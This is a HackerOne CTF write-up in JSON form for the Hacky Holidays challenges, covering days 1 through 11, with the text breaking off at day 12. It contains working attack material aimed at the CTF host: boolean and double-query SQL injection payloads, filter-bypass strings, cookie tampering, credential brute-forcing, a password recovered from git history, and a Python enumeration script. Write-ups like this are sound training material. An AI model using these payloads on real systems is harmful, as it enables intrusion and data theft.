{"id":1066914,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDY2OTE0","url":"https://hackerone.com/reports/1066914","title":"[ Hacky Holidays CTF ] Completely taken down the Grinch Networks","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-12-27T08:52:23.231Z","submitted_at":"2020-12-27T08:52:23.328Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hein_thant","url":"/hein_thant","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/X55GnoH6WxBMwuWSC56rEpDt/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2021-01-11T21:32:20.523Z","bug_reporter_agreed_on_going_public_at":"2021-01-07T21:37:49.341Z","team_member_agreed_on_going_public_at":"2021-01-11T21:32:20.375Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Day 1 - Robot flag**\n\nWe're presented with sample ui page without any function. So I guessed content discovery is the best way to find flag.\n\nAnd robots.txt came to my mind and found the flag.\n\n\u003e\u003ehttps://hackyholidays.h1ctf.com/robots.txt\n\nResponse\n```\nUser-agent: *\nDisallow: /s3cr3t-ar3a\nFlag: flag{48104912-28b0-494a-9995-a203d1e261e7}\n```\n\n\u003e\u003eFlag 1-:  flag{48104912-28b0-494a-9995-a203d1e261e7}==\n\n**Day 2 - s3cr3t-ar3a**\n\nYou may noticed that we saw strange text in robots.txt\n\n   Disallow: /s3cr3t-ar3a\n\nWhen I tried to access this page, it look like the removed page but checked the source with Inspect Element and found the flag\n\n```\n\u003cdiv class=\"alert alert-danger text-center\" id=\"alertbox\" data-info=\"flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}\" next-page=\"/apps\"\u003e\n\u003cp\u003eI've moved this page to keep people out!\u003c/p\u003e\n\u003cp\u003eIf you're allowed access you'll know where to look for the proper page!\u003c/p\u003e\n\u003c/div\u003e\n```\n\u003e\u003eFlag 2-: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}\n\n**Day 3 - Grinch People Rater**\n\n\u003e\u003ehttps://hackyholidays.h1ctf.com/people-rater\n\nDay 3 challenge starts with a little fancy thing but nothing much yet .\n\nThere are 16 people names in page and by clicking any name makes a GET request along with their base64 decoded user id to retrieve information.\n\nI checked the first one \"Tea Avery\"  and his/her id was 2.\n\neyJpZCI6Mn0 = {\"id\":2}\n\nBasically his/her id probably should be 1 but it wasn't, so who is User {\"id\":1} ?\n\nI encoded {\"id\":1} to base64 and make a request to see what happens and of course, it was the Grinch and retrieved flag along with his information.\n\n{F1131249}\n\n\u003e\u003eFlag 3 -:  flag{b705fb11-fb55-442f-847f-0931be82ed9a}\n\n**Day 4 - Grinch Swag Shop**\n\n\u003e\u003ehttps://hackyholidays.h1ctf.com/swag-shop\n\nSimple swag shop but when we tried to purchase some item, Login page was appeared.\n\nNeither we don't have any provided credentials nor account register page, we may find a way to get access as authenticated user.\n\nAfter collecting some endpoints, I got the following list\n```\n/swag-shop/api/purchase\n/swag-shop/checkout/\n/swag-shop/api/login\n```\n\nAs per my experience, I looked for /swag-shop/api/user and got the following response\n```\nHTTP/1.1 400 Bad Request\nServer: nginx/1.18.0 (Ubuntu)\n....\n{\"error\":\"Missing required fields\"}\n```\n\nInteresting but not that much useful, then I run [Arjun](https://github.com/s0md3v/Arjun) through this api endpoint and found a valid parameter \"**uuid**\".\n\n{F1131256}\n\nWe needed to find valid  **\"uuid\"**  value and I wasn't able to get it. So I fuzzed using [ffuf](https://github.com/ffuf/ffuf) and got  the following api endpoint leaking some user session.\n\n\u003e\u003ehttps://hackyholidays.h1ctf.com/swag-shop/api/sessions\n\n{F1131258}\n\n I decoded all sessions value and one of these sessions contained valid uuid parameter value.\n\n{\"user\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\"cookie\":\"MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY=\"}\n\nNow all we have to do is just append the uuid value in above user api endpoint and get the flag.\n\n{F1131250}\n\n\u003e\u003eFlag 4 -: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}\n\n**Day 5 - Secure Login**\n\n\u003e\u003ehttps://hackyholidays.h1ctf.com/secure-login\n\nAs it said, we just need to login to get flag.\nPutting random default credentials resulted \"Invalid Username\".It look like we need to brute force to get valid username first.\nAfter running Burp Intruder a while with rockyou.txt , got a valid username \"access\".\nRepeat same process for password and found \"computer\" as valid password.\n\nLogged in and we see the error \"No Files To Download\", and the cookie parameter is interesting \n\nsecurelogin:\"eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=\"\n\nDecoding the value got the following text.\n\n{\"cookie\":\"1b5e5f2c9d58a30af4e16a71a45d0172\",\"admin\":false}\n\nChange parameter admin to \"true\"  and we're provided with encrypted zip file.\n\n{F1131260}\n\nNow simply run the fcrackzip in order to crack zip file and found the password  \" hahahaha\".\n\n\u003e\u003efcrackzip -u -D -p rockyou-75.txt my_secure_files_not_for_you.zip\n\n{F1131262}\n\nUnzip the file and got the flag!!\n\n\u003e\u003eFlag 5 -: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}\n\n**Day 6 - My-diary**\n\n\u003e\u003ehttps://hackyholidays.h1ctf.com/my-diary/?template=entries.html\n\nAs you could see, the first thing came to my mind is LFI but failed to read local file like /etc/passwd so I tried to read default thing like index.php.\n\nAnd now we can see the source code\n```\n\u003c?php\nif( isset($_GET[\"template\"])  ){\n    $page = $_GET[\"template\"];\n    //remove non allowed characters\n    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);\n    //protect admin.php from being read\n    $page = str_replace(\"admin.php\",\"\",$page);\n    //I've changed the admin file to secretadmin.php for more security!\n    $page = str_replace(\"secretadmin.php\",\"\",$page);\n    //check file exists\n    if( file_exists($page) ){\n       echo file_get_contents($page);\n    }else{\n        //redirect to home\n        header(\"Location: /my-diary/?template=entries.html\");\n        exit();\n    }\n}else{\n    //redirect to home\n    header(\"Location: /my-diary/?template=entries.html\");\n    exit();\n}\n```\n\u003e\u003e$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);\n\nThe first preg_replace() function does to prevent from reading local file so we might skip this part.\n\n    //protect admin.php from being read\n    $page = str_replace(\"admin.php\",\"\",$page);\n\nAs it said, the above str_replace() function protect from being read \"admin.php\" but we can simply bypass this by tricking like\n\n\u003e\u003e?template=admadmin.phpin.php\n\n{F1131259}\n\nbut  our flag is in \"secretadmin.php\" so we can simply use to bypass the same way above using the payload\n\n\u003e\u003ehttps://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretadminadmin.php.phpmin.php\n\nAnd we got the flag!!\n\n{F1131252}\n\n\u003e\u003eFlag 6 -: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}\n\n**Day 7 - Hate Mail Generator**\n\nhttps://hackyholidays.h1ctf.com/hate-mail-generator\n\nBy looking sample campaign, I got know that we can use template to create campaign but generating new campaign causing error but we can use preview.\n\n```\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\n......\npreview_markup=Hello,{{name}}\u0026preview_data={\"name\":\"Alice\",\"email\":\"alice@test.com\"}\n```\nAnd we got the response\n\n```\nHello, Alice\n```\nI tried normal template injection payload and didn't work then I noticed that we could use to render the .html file using {template:cbdj3_grinch_header.html}\n\nAt this time, I run dirsearch and found this template folder https://hackyholidays.h1ctf.com/hate-mail-generator/templates/\n\n{F1131261}\n\nAs we can see, the 38dhs_admins_only_header.html file is interesting but it give response 403.But what if we can render this file using above\ntemplate markup.I tried to render this page like this \n```\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\n......\npreview_markup=Hello,{{name}}\u0026preview_data={\"name\":\"{{template:38dhs_admins_only_header.html}}\",\"email\":\"alice@test.com\"}\n```\nAnd we got the flag straightforward\n\n{F1131247}\n\n\u003e\u003eFlag 7 -: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}\n\nDay 8 - Grinch Forum\n\nhttps://hackyholidays.h1ctf.com/forum\n\nIt's simple , we just need to login to get the flag but how?\n\nI tried different ways to login like brute forcing username/password, sqli, but nothing worked.\nAlso found the phpmyadmin login page but couldn't able to login\n\nThen I had no idea , just search \"Grinch Networks\" in google and found interesting [repo](https://github.com/Grinch-Networks/forum) created by challenge author in his profile.\n\nAfter looking for a while, I thought he just leaked this repo by mistake but i just noticed there are some commits in repo.\n\n\u003e https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae\n\n```\n static public function read(){\n        if( gettype(self::$read) == 'string' ) {\n            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );\n            self::$read = new DbConnect( false, '', '','' );\n        }\n        return self::$read;\n    }\n@@ -146,7 +146,7 @@ public static function closeAll(){\n     */\n    static public function write(){\n        if( gettype(self::$write) == 'string' ) {\n            self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );\n            self::$write = new DbConnect( true,  '', '','' );\n        }\n        return self::$write;\n    }\n```\nBy comparing with new code, he just removed these credentials from repo.So I was able to login phpmyadmin using this info and found Admin login username and password.\n```\nid \tusername \tpassword \t                                                                 admin\n1 \tgrinch \t35D652126CA1706B59DB02C93E0C9FBF \t1\n2 \tmax \t388E015BC43980947FCE0E5DB16481D1\n```\nSimply cracked the grinch password and we logged into admin panel and found the flag\n\n{F1131248}\n\n\u003e\u003eFlag 8 -: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}\n\n**Day 9 - Evil Quiz**\n\nFirstly, when we try to simple name and submit quiz answers\n```\nPOST /evil-quiz/ HTTP/1.1\nHost: hackyholidays.h1ctf.com\n.....\nCookie: session=7d63eaccc80ec7b6553c0b19ec10e4d0\n....\nname=lol\n```\n\nGot the response in https://hackyholidays.h1ctf.com/evil-quiz/score endpoint saying\n\n\"***There is 1 other player(s) with the same name as you!***\"\n\nBut adding ' at the end of name got the response \"***There is 0 other player(s) with the same name as you!***\"\n\nand I believed \"name\" parameter is vulnerable to second order sql  injection. \n\nnow we need to fix the query to confirm the sql injection\nAdding   --        as comment  didn't work\nAdding   --+-   as comment didn't work\nAdding    #          as comment worked\n\nSo I confirmed this parameter is probably vulnerable to second order sql  injection. For further exploitation,I run sqlmap but didn't success. ( may be I missed something with sqlmap )\n\nThen I decided to do manual injection with boolean based as I was lazy to automate by writing own script .\n\nGetting table\n```\nRequest\n\nname = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))\u003c100#\n\nResponse\n\nThere is 769468 other player(s) with the same name as you!\n```\nIt means **TRUE** that the ASCII value of table_name's first character is less than 100 and we need to specify more\n```\nRequest\n\nname=lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))\u003c90#\n\nResponse\n\nThere is 0 other player(s) with the same name as you!\n```\n\nIt means **FALSE** that the ASCII value of table_name's first character isn't less than 90 so we can confirm the first character is between 90-100.\n\nBy trying each number, we found the valid one.\n\n```\nname=lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))=97#\n\nTRUE\n```\n97 is the value of  [ASCII](https://www.ascii-code.com/) character \"a\" so we know that the first character of table name is \"a\".\n\nwe can get the next letter by incrementing the 1, to a 2, in our substring() statement.\n\n```\nname = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))\u003e90#\n\nTRUE\n\nname = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))\u003c100#\n\nFALSE\n\nname = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))=100#\n\nTRUE\n```\nConverting 100 to ASCII character we got \"d\" . so  probably the table_name is \"admin\".\nNow let's get the columns with the following query.\n```\nname =lol'+or+Ascii(substring((Select+concat(column_name)+from+information_schema.columns+where+table_name=0x61646d696e+limit+0,1),1,1))\u003e0#\n```\nKeep doing the same way as above, so far we have the valid columns \"username\" and \"passsword\"\n\nGetting username\n```\nname = lol'+or+Ascii(substring((Select+concat(username)+from+admin+limit+0,1),1,1))\u003e0#\n```\nGetting password\n```\nname = lol'+or+Ascii(substring((Select+concat(password)+from+admin+limit+0,1),1,1))\u003e0#\n```\nNow we have the username and password to login [admin panel](https://hackyholidays.h1ctf.com/evil-quiz/admin)\nusername = admin  \npassword = S3creT_p4ssw0rd-$\n\nUpon logging with above credentials, we can see the flag finally.\n\n{F1131251}\n\nPS. Actually this challenge took me 5-6 hours to get the final flag because the server takes too long to response to the request.\n\n\u003e\u003eFlag 9 -: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}\n\n**Day 10  - SignUp Manager**\n\nhttps://hackyholidays.h1ctf.com/signup-manager/\n\nAt first sight, we're provided with simple SignUp and Login page.\n\nBy checking source code, found the comment \n\n\u003c!-- See README.md for assistance --\u003e\n\nUpon looking for README.md , we know file zip file path which might be included source codes.\n\n\u003e\u003ehttps://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip\n\n***Analyzing the source code***\n\nAfter reviewing multiples php files, index.php look interesting.\n\nLet's take a look at Signup function\n```\n\u003c?php\n        if ($_POST[\"action\"] == 'signup' \u0026\u0026 isset($_POST[\"username\"], $_POST[\"password\"], $_POST[\"age\"], $_POST[\"firstname\"], $_POST[\"lastname\"])) {\n            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST[\"username\"]), 0, 15);\n            if (strlen($username) \u003c 3) {\n                $errors[] = 'Username must by at least 3 characters';\n            } else {\n                if (isset($all_users[$username])) {\n                    $errors[] = 'Username already exists';\n                }\n            }\n            $password = md5($_POST[\"password\"]);\n            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST[\"firstname\"]), 0, 15);\n            if (strlen($firstname) \u003c 3) {\n                $errors[] = 'First name must by at least 3 characters';\n            }\n            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST[\"lastname\"]), 0, 15);\n            if (strlen($lastname) \u003c 3) {\n                $errors[] = 'Last name must by at least 3 characters';\n            }\n            if (!is_numeric($_POST[\"age\"])) {\n                $errors[] = 'Age entered is invalid';\n            }\n            if (strlen($_POST[\"age\"]) \u003e 3) {\n                $errors[] = 'Age entered is too long';\n            }\n            $age = intval($_POST[\"age\"]);\n            if (count($errors) === 0) {\n                $cookie = addUser($username, $password, $age, $firstname, $lastname);\n                setcookie('token', $cookie, time() + 3600);\n                header(\"Location: \" . explode(\"?\", $_SERVER[\"REQUEST_URI\"])[0]);\n                exit();\n            }\n        }\n?\u003e\n```\nAs far as we saw, Signup function straightforward expect the character limit for various input. OK , now let's jump into AddUser() function\n```\n\u003c?php\nfunction addUser($username,$password,$age,$firstname,$lastname){\n    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date(\"U\").microtime().rand() );\n    $line = '';\n    $line .= str_pad( $username,15,\"#\");\n    $line .= $password;\n    $line .= $random_hash;\n    $line .= str_pad( $age,3,\"#\");\n    $line .= str_pad( $firstname,15,\"#\");\n    $line .= str_pad( $lastname,15,\"#\");\n    $line .= 'N';\n    $line = substr($line,0,113);\n    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);\n    return $random_hash;\n?\u003e\n```\nIt simply takes our input and \n\n\u003e fill up to 15 characters\n\u003e append these all in one line using \".=\" operator\n\u003e put all conetnt in users.txt\n\u003e return random_hash to set user session.\n\nNow take a look at, builduser() function\n```\n\u003c?php\nfunction buildUsers(){\n    $users = array();\n    $users_txt = file_get_contents('users.txt');\n    foreach( explode(PHP_EOL,$users_txt) as $user_str ){\n        if( strlen($user_str) == 113 ) {\n            $username = str_replace('#', '', substr($user_str, 0, 15));\n            $users[$username] = array(\n                'username' =\u003e $username,\n                'password' =\u003e str_replace('#', '', substr($user_str, 15, 32)),\n                'cookie' =\u003e str_replace('#', '', substr($user_str, 47, 32)),\n                'age' =\u003e intval(str_replace('#', '', substr($user_str, 79, 3))),\n                'firstname' =\u003e str_replace('#', '', substr($user_str, 82, 15)),\n                'lastname' =\u003e str_replace('#', '', substr($user_str, 97, 15)),\n                'admin' =\u003e ((substr($user_str, 112, 1) === 'Y') ? true : false)\n            );\n        }\n    }\n    return $users;\n?\u003e\n```\nThe first line set the array which named $users and get user info from file content of users.txt.\n\nThen get the each stored values using substr()  and removed \"#\" characters and save at $users arrray.\n\nThe last one is interesting that it compare the last character of our strings to \"Y\" \n\u003e 'admin' =\u003e ((substr($user_str, 112, 1) === 'Y') ? true : false)\n\nand if  it returns true, we got admin access by  following code.\n```\n\u003c?php\n$all_users = buildUsers();\n$page = 'signup.php';\nif( isset($_COOKIE[\"token\"]) ){\n    foreach( $all_users as $u ){\n        if( $u[\"cookie\"] === $_COOKIE[\"token\"] ){\n            if( $u[\"admin\"] ){\n                $page = 'admin.php';\n            }else{\n                $page = 'user.php';\n            }\n        }\n    }\n}\n?\u003e\n```\nBut normally  it's not possible to make the last character \"Y\" because you might notice that  $line .= 'N'; append 'N' in the last of our info in user.txt.\nSo we need to find a way to push our input into last character to be \"Y\".\n\nAfter looking hours for multiple function, \n\n\u003e $age = intval($_POST[\"age\"]);\n \nThis intval() function took my attention. We are allowed to set age number up to 3 characters and these number needed to be numeric.\n```\n\u003c?php\nif (!is_numeric($_POST[\"age\"])) {\n                $errors[] = 'Age entered is invalid';\n            }\n            if (strlen($_POST[\"age\"]) \u003e 3) {\n                $errors[] = 'Age entered is too long';\n            }\n            $age = intval($_POST[\"age\"]);\n?\u003e\n```\nI read the documentation abot intval() function and came to know that we can use this  scientific notation 'e' to get longer number  with 3 characters.\n```\n\u003c?php\necho intval(1e3);                        //1000\necho intval(1e4);                       //10000\necho intval(1e5);                       // 100000 \necho intval(1e10);                    //  10000000000 \n?\u003e\n```\nNow, it's time to construct our final payload to get flag.when we set age number to \"1e5\" the server calculate the value and response with 100000.\nSo the final input payload become like this.\n\n```\nPOST /signup-manager/ HTTP/1.1\nHost: hackyholidays.h1ctf.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0\n.....\n.....\n\naction=signup\u0026username=LMAO\u0026password=12345\u0026age=1e5\u0026firstname=XXXXXXXXXXXXXXX\u0026lastname=YYYYYYYYYYYYYYY\n```\nOur last name field become the last character \"Y\" because the following code stripped the string if it was more than 113 characters.\n\n\u003e$line = substr($line,0,113);\n\nAnd now when this function check the last character of our string it will return TRUE .\n\n\u003e'admin' =\u003e ((substr($user_str, 112, 1) === 'Y') ? true : false)\n\nFinally, we got admin access and found the flag.\n\n{F1131253}\n\n\u003e\u003eFlag 10 -: flag{99309f0f-1752-44a5-af1e-a03e4150757d}\n\n**Day 11 - Grinch Recon Server**\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/\n\nInitial running dirsearch found the api endpoint https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/\nBut when we try to make any request to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/* , got the response saying\n\n\"This endpoint cannot be visited from this IP address\"\n\nI thought it might be accessible by adding some custom headers but nothing worked.\n\nAnd then looked into photo album,it didn't take long to identify that the  hash parameter is vulnerable to sql injection.\n```\nIdentifying Sql injection\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol'            Response  404\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k--+-     Response 200\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k' order by  4--+-  Reponse 404\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k ' order+by 3--+-   Response 200\n\nGetting vulnerable column\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select 1,2,3--+-     Response 200 and 3rd column is printed\n(Please note that we need to remove original hash value to see vulnerbale column)\n\nTrying to extract table name using the query\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select 1,2,table_name+from information_schema.tables where table_schema=database()--+-\n```\n\nBut it didn't work. After trying to bypass with various ways, something came up with Double Query injcetion.\n```\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select \"1'\",\"2\",\"3\"--+-\n\nPutting ' in the first column and something strange happend and fix the query by comment(--+-) and got the normal response back.\n\n\u003e\u003ehttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select \"1'--+-\",\"2\",\"3\"--+-\n```\n\nNow we can confirm double query injection is possible here. Let's move further.\n```\n\u003e\u003ehttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select \"1' order by 4--+-\",\"2\",\"3\"--+-    ERROR\n\n\u003e\u003ehttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select \"1' order by 3--+-\",\"2\",\"3\"--+-     Normal Reponse\n\n\u003e\u003ehttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select \"1' union select \\\"1\\\",\\\"2\\\",\\\"3\\\"--+-\",\"2\",\"3\"--+-\n\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/3\",\"auth\":\"fea7507478aa8225c022527b1763fb33\"}\n```\nUpon executing above query, we got the response which vulnerable column is reflecting image request data.\n```\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select \"1' union select \\\"1\\\",\\\"2\\\",database()--+-\",\"2\",\"3\"--+-\n\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/recon\",\"auth\":\"015cc4ed326cfc9e314afdaf594a5ce3\"}\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select \"1' union select \\\"1\\\",\\\"2\\\",version()--+-\",\"2\",\"3\"--+-\n\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/8.0.22-0ubuntu0.20.04.3\",\"auth\":\"03d2bc97a58dc15c4eaf5d4fa2d9f93d\"}\n```\nCombining with path traversal, we can generate valid auth hash for any endpoint which we want to make reuqest.\n```\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT \"1' union select \\\"1\\\",\\\"2\\\",\\\"../api/\\\"--+-\",\"2\",\"3\"--+-\n\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/\",\"auth\":\"05a7e708a5f3da76506023047628829d\"}\n```\nNow we can perfrom request to api endpoint /api/* with valid auth hash.\n```\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9\n```\nOne thing is that we need to find valid endpoint to make requests.After guessing multiple endpoints, the following endpoint seems to be valid bocz it response with \"Invalid content type detected\" .Normally if we make request to invalid endpoint the server responses us with 404.\n\n```\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT \"1' union select \\\"1\\\",\\\"2\\\",\\\"../api/lol\\\"--+-\",\"2\",\"3\"--+-\n\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/lol\",\"auth\":\"494c095363e0f1a99e1c869887522c62\"}\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2xvbCIsImF1dGgiOiI0OTRjMDk1MzYzZTBmMWE5OWUxYzg2OTg4NzUyMmM2MiJ9\n\nExpected HTTP status 200, Received: 404\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT \"1' union select \\\"1\\\",\\\"2\\\",\\\"../api/user\\\"--+-\",\"2\",\"3\"--+-\n\nInvalid content type detected\n```\n\nBy using the same method, we can guess the  parameters either and found username and password.\n```\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT \"1' union select \\\"1\\\",\\\"2\\\",\\\"../api/user?test=lol\\\"--+-\",\"2\",\"3\"--+-\n\nExpected HTTP status 200, Received: 400 Bad Request\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT \"1' union select \\\"1\\\",\\\"2\\\",\\\"../api/user?username=lol\\\"--+-\",\"2\",\"3\"--+-\n\nExpected HTTP status 200, Received: 204\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT \"1' union select \\\"1\\\",\\\"2\\\",\\\"../api/user?password=lol\\\"--+-\",\"2\",\"3\"--+-\n\nExpected HTTP status 200, Received: 204\n```\nSo far, we have valid api endpoint and parameters either, now final step is to get valid username and password.\n\nIn this case, we can use sql wildcard character (% , _ ) to enumerate username and password.Let's see how it works.\n\nFirstly , let's confrim how many length has username and password.\n\n```\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT \"1' union select \\\"1\\\",\\\"2\\\",\\\"../api/user?username=__________%\\\"--+-\",\"2\",\"3\"--+-  ( 10 underscores )\n\nExpected HTTP status 200, Received: 204\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT \"1' union select \\\"1\\\",\\\"2\\\",\\\"../api/user?username=___________%\\\"--+-\",\"2\",\"3\"--+-  ( 11 underscores )\n\nInvalid content type detected\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT \"1' union select \\\"1\\\",\\\"2\\\",\\\"../api/user?username=____________%\\\"--+-\",\"2\",\"3\"--+-  ( 12 underscores )\n\nExpected HTTP status 200, Received: 204\n\nOK so username has 10 characters, let's see about passoword\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT \"1' union select \\\"1\\\",\\\"2\\\",\\\"../api/user?username=__________%\\\"--+-\",\"2\",\"3\"--+-  ( 10 underscores )\n\nInvalid content type detected\n\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT \"1' union select \\\"1\\\",\\\"2\\\",\\\"../api/user?username=___________%\\\"--+-\",\"2\",\"3\"--+-  ( 11 underscores )\n\nExpected HTTP status 200, Received: 204\n```\nNow we're able to identify that username has 11 characters and password has 10 characters.\nIn order to extract username and password, I made a lazy script to automate these steps.\n\n```\n#!/usr/bin/python3\nimport requests\nfrom urllib.request import urlopen\nfrom bs4 import BeautifulSoup\nimport string\nimport numpy as np\n\nalphabet = list(string.ascii_lowercase)\nnumber = list(range(0,10))\nfuzz = np.concatenate((alphabet,number))\nusername = \"\"\nwhile len(username) \u003c 11:\n\tfor i in fuzz:\n\t\ti = username + i\n\t\tpayload = \"lol%20%27%20UNION%20SELECT%20%221%27%20union%20select%20\\%221\\%22,\\%222\\%22,\\%22../api/user?username={}%\\%22--+-%22,%222%22,%223%22--+-\".format(i)\n\t\turl = \"https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash={}\".format(payload)\n\t\treq = urlopen(url)\n\t\tbs = BeautifulSoup(req.read(), 'html.parser')\n\t\tresponse = bs.find_all('img',class_='img-responsive')\n\t\timg_data = response[2]\n\t\tsec_req =requests.get(\"https://hackyholidays.h1ctf.com\"+img_data['src'])\n\t\tresponse_txt = sec_req.text\n\t\tif \"Invalid content type detected\" not in response_txt:\n\t\t\tcontinue\n\t\telse:\n\t\t\tusername = username + i[-1]\n\t\t\tprint(\"Found valid character: \"+i)\n\t\t\tbreak\nelse:\n\tprint(\"Here's the final username: \"+username)\n```\nRun the script and get the valid username : grinchadmin\n\n{F1131246}\n\nFor the password, we can either use above script by making a little changes\n\n{F1131246}\n\nNow, simply login into attack-box and find the flag.\n\n\u003ehttps://hackyholidays.h1ctf.com/attack-box/login\n\n{F1131254}\n\n\u003e\u003eFlag 11 -: flag{07a03135-9778-4dee-a83c-7ec330728e72}\n\n**Day 12 - Grinch Network Attack Server**\n\nAs it's saying 